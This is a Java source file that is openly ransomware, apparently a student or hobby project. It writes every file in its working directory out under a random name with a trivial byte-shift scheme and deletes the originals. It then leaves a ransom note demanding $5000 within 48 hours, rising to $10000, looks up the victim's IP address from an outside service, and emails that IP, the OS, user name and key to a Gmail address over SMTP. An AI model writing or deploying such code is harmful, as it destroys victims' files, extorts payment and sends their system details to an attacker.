/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ransomware_enc;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.MalformedURLException;


import java.net.URL;
import java.util.Properties;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;



import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;




/**
 *
 * @author amine gasa
 */
public class Ransomware_enc {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
       File ff=new File("");
       File src=new File(ff.getAbsolutePath()/*"C:\\Users\\amine gasa\\Desktop\\test"*/);
       File []files=src.listFiles();
     try{  for(File f : files){
           if(!f.getName().equals("lib")){
               Encrypting(f,src); f.delete();
           }
           if(f.getName().equals("ransomware_enc")){
               f.delete();
           }
       }}catch (Exception e){
           
       }
       ff=new File("important file.txt");
       FileWriter fw=new FileWriter(ff);
       PrintWriter pw=new PrintWriter(fw);String key="QDam78AZMLOoi20M?bvWxVP";
        pw.println("Your data are encrypted");
        pw.println("to recover you data you shloud payed 5000$ before 48 hour ,if you don't payed it in this period ");
          pw.println("the sum will be increased into 10000$ ");
          pw.println("contact me in my email :aminegasatest@gmail.com");
           pw.println("your key is : "+key);pw.close();
           Email email =new Email("aminegasatest@gmail.com", /*your email password*/"", "aminegasatest@gmail.com"
                   , "aminegasatest@gmail.com", "smtp.gmail.com", "target fall", getMyIp_os()+"\n key : "+key)
                   ;email.sending();
                   
      //  System.out.println(getMyIp_os());
        
    }
    static byte[] EncryptAlgo(byte []data){
        byte []enc =new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            if(i %2==0) enc[i]=(byte)(data[i]+1);
            else enc[i]=(byte)(data[i]-2);
        }
        
    return enc;}
    static String getRandomName(int lenght,String extend){
     Random r=new Random();
     StringBuilder res=new StringBuilder();
        for (int i = 0; i < lenght; i++) {
            char c='a';
            int width=26;
            if(r.nextInt(3)==0){
                c='A'; width=26;
            }
            if(r.nextInt(3)==1){
                c='0'; width=10;
            }
           res.append((char)(c+r.nextInt(width)));
        }
       res.append(".").append(extend);
    return  res.toString();}
   static void Encrypting( File source , File dest) throws IOException{
       InputStream is =null;
       OutputStream os=null;
       dest=new File(dest.getPath().concat("/").concat(getRandomName(10, "GaSa")));
       try{
          is=new FileInputStream(source);
          os=new FileOutputStream(dest);
          os.write(new byte[]{(byte)source.getName().length()});
          os.write(StringtoByte(source.getName()));
          byte []buffer =new byte[1024];
          int lenght;
          while((lenght=is.read(buffer))>0){
              EncryptAlgo(buffer);
              os.write(buffer,0,lenght);
          }
       }finally{
         is.close();os.close();
       }
   }
static byte[] StringtoByte(String data){
    char ca[]=data.toCharArray();
    byte []res=new byte[ca.length*2];
    for (int i = 0; i < res.length; i++) {
        res[i]=(byte)((ca[i/2]>>(8-(i%2)*8))& 0xff);
        
    }
return res;}
static String getMyIp_os() throws IOException{
    String myIp = null;String sys_info = null;
    String url="https://ipv4bot.whatismyipaddress.com/";
        try {
            BufferedReader br=new BufferedReader(new InputStreamReader(new URL(url).openStream()));
           myIp =br.readLine();
             String os=System.getProperty("os.name");
       String os_arch=System.getProperty("sun.arch.data.model");
       String cpu_arch=System.getProperty("os.arch");
       String user_name=System.getProperty("user.name");
     sys_info  ="os is : "+os+"\n os architecture :"+os_arch+"\n cpu architecture :"+cpu_arch+"\n user name : "+user_name;
        } catch (MalformedURLException ex) {
            Logger.getLogger(Ransomware_enc.class.getName()).log(Level.SEVERE, null, ex);
        }
       
return "ip : "+myIp+"\n"+sys_info;}
static class Email{
    String username;
    String password;
    String fromEmail,toEmail,host,subject,messagetext;

        public Email(String username, String passwword, String fromEmail, String toEmail, String host, String subject, String messagetext) {
            this.username = username;
            this.password = passwword;
            this.fromEmail = fromEmail;
            this.toEmail = toEmail;
            this.host = host;
            this.subject = subject;
            this.messagetext = messagetext;
        }
    
        void sending(){
            Properties properties=new Properties();
            properties.put("mail.smtp.auth", "true");
		properties.put("mail.smtp.starttls.enable", "true");
		properties.put("mail.smtp.host", host);
		properties.put("mail.smtp.port", "587");
                /*  Session session=Session.getInstance(properties,new javax.mail.Authenticator(){
                      protected PasswordAuthentication GetPasswordAuthentication(){
                          
                     return  new PasswordAuthentication(username,"aminegasatestaminegasatest".toCharArray());}
                  });*/
                  Session session = Session.getInstance(properties, new javax.mail.Authenticator() {
                    
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username,password);
			}
		});
                  
               MimeMessage msg=new MimeMessage(session);
               try {
			msg.setFrom(new InternetAddress(fromEmail));
			msg.addRecipient(Message.RecipientType.TO, new InternetAddress(toEmail));
			msg.setSubject(subject);
			msg.setText(messagetext);
			Transport.send(msg);
			System.out.println("keys sent successfully");
		} catch (MessagingException e) {
			e.printStackTrace();
		}
        }
       
            
}
}
